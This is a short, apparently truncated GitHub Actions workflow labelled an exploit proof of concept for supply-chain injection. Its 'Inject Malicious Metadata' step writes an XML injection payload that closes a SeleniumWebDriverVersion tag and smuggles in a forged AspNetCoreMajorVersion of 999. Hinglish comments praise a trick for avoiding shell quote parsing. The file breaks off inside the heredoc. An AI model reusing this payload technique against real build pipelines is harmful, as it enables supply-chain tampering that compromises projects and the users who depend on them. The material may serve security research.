name: "Exploit PoC: Supply Chain Injection"

on:
  workflow_dispatch:

jobs:
  supply-chain-poisoning:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: "Inject Malicious Metadata"
        id: metadata
        # Elite Trick: Hum payload ko ek ENV block ke andar define kar rahe hain
        # jisse shell ko koi quote parsing karni hi nahi padegi.
        run: |
          cat << 'EOF' > payload.txt
          1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>
